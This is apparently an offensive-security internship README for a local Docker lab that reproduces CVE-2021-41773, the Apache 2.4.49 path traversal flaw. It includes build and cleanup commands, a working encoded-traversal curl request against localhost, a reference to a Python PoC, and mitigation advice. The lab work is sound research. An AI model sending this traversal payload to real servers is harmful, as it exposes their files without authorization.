# CVE-2021-41773 — Apache HTTP Server 2.4.49 Lab & PoC

**ITSOLERA PVT LTD — Offensive Security Internship**  
**Task:** CVE Exploit Research & Development  
**Date:** 14th August 2026

> For local and isolated lab use only. The lab was tested against a Docker
> container running on `127.0.0.1`. Do not expose the vulnerable container
> to untrusted networks or test systems without authorization.

## Overview

This project contains my Docker lab, Python PoC, exploitation evidence, and
report for **CVE-2021-41773**, a path traversal and file disclosure
vulnerability in Apache HTTP Server 2.4.49.

| Item | Details |
|---|---|
| CVE | CVE-2021-41773 |
| Affected version | Apache HTTP Server 2.4.49 |
| Lab | Docker, isolated/local |
| Exploit | Python raw-socket PoC |

## Repository Structure

```text
CVE-2021-41773/
├── Dockerfile
├── exploit.py
├── README.md
├── screenshots/
│   ├── 01-docker-build.png
│   ├── 02-apache-version.png
│   ├── 03-container-running.png
│   ├── 04-test-file.png
│   ├── 05-manual-exploit.png
│   └── 06-python-poc.png
└── CVE-2021-41773-Report.pdf
```

## 1. Build the Lab

```powershell
docker pull httpd:2.4.49
docker build -t apache-cve-2021-41773-lab .
docker images apache-cve-2021-41773-lab
```

## 2. Run the Container

```powershell
docker run -d --name apache-vuln-lab -p 8081:80 apache-cve-2021-41773-lab
docker ps
```

## 3. Verify Apache Version

```powershell
docker exec apache-vuln-lab httpd -v
```

The output should confirm:

```text
Apache/2.4.49
```

Create the controlled test file:

```powershell
docker exec apache-vuln-lab sh -c "echo 'CVE-2021-41773-TEST-FILE' > /tmp/cve-test.txt"
docker exec apache-vuln-lab cat /tmp/cve-test.txt
```

## 4. Manual Exploitation

```powershell
curl.exe -i --path-as-is "http://127.0.0.1:8081/cgi-bin/.%2e/.%2e/.%2e/.%2e/tmp/cve-test.txt"
```

A successful result returns `HTTP 200 OK` and the contents of the controlled
test file.

The `--path-as-is` option prevents curl from normalizing the traversal path
before sending the request.

## 5. Python PoC

```powershell
python exploit.py http://127.0.0.1:8081
```

The PoC uses a raw TCP socket to send the HTTP request without client-side
URL normalization.

A successful execution should return `HTTP 200 OK` and the contents of the
controlled test file.

## 6. Cleanup

```powershell
docker stop apache-vuln-lab
docker rm apache-vuln-lab
docker rmi apache-cve-2021-41773-lab
```

## Mitigation

- Upgrade Apache HTTP Server to 2.4.51 or later.
- Disable unnecessary CGI execution.
- Apply least-privilege filesystem permissions.
- Monitor for encoded traversal sequences in HTTP logs.

Detailed root-cause analysis, exploitation steps, impact, and mitigation
are provided in the full report.

## References

- NVD — CVE-2021-41773
- Apache HTTP Server Security Advisories
- MITRE CVE
- PayloadsAllTheThings — Path Traversal
